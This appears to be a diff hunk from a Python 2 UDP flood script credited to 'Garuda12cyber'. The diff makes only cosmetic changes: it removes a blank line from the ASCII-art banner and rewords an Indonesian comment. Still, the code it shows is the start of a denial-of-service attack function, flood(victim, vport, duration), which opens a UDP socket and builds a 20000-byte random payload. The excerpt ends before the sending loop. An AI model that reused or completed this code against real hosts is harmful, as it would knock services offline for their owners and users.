@@ -27,13 +27,12 @@ def usage():
     print "\033[1;37m ..`              `.--:::::-:::::--.`              `.``"
     print "\033[1;37m   ..`                                          `..`"
     print "\033[1;37m     ..```````````````````````````````````````..`"
-    
     print "\033[1;31m Author   : Garuda12cyber"
     print "\033[1;31m Gmail    : garuda12cyber@gmail.com"
     print "\033[1;37m github   : https://github.com/Garuda12cyber"
 def flood(victim, vport, duration):
     # Support us yaakk... :)
-    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    # Okey Jadi disini Garuda12cyber membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
     bytes = random._urandom(20000)
